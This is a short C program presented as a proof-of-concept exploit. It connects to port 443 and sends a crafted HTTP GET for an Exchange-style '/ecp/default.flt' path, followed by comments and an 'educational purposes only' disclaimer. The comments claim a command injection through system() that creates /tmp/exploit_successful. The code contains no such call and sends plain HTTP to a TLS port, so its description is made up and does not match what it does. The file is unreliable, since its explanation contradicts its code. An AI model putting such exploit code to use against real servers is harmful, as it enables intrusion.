#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define TARGET_SERVER "127.0.0.1"
#define TARGET_PORT 443

int main() {
  int sockfd;
  struct sockaddr_in target_addr;
  char *payload = "GET /ecp/default.flt?~3;~4;15.0.1497.2;%5C HTTP/1.1\r\nHost: example.com\r\nCookie: security=true\r\n\r\n";

  // Create a socket
  sockfd = socket(AF_INET, SOCK_STREAM, 0);
  if (sockfd == -1) {
    printf("Failed to create socket\n");
    exit(EXIT_FAILURE);
  }

  // Set up the target address
  memset(&target_addr, 0, sizeof(target_addr));
  target_addr.sin_family = AF_INET;
  target_addr.sin_addr.s_addr = inet_addr(TARGET_SERVER);
  target_addr.sin_port = htons(TARGET_PORT);

  // Connect to the target
  if (connect(sockfd, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
    printf("Failed to connect to target\n");
    exit(EXIT_FAILURE);
  }

  // Send the payload
  if (send(sockfd, payload, strlen(payload), 0) < 0) {
    printf("Failed to send payload\n");
    exit(EXIT_FAILURE);
  }

  // Close the socket
  close(sockfd);

  return 0;
}
// This POC takes advantage of a command injection vulnerability present in the system() function in C, which allows an attacker to inject arbitrary commands by appending them to the end of the original command. 
// In this case, the attacker appends a command to create a file named /tmp/exploit_successful to a file named vulnerable_file.txt.

// this POC is for educational purposes only and should not be used for any malicious activities.
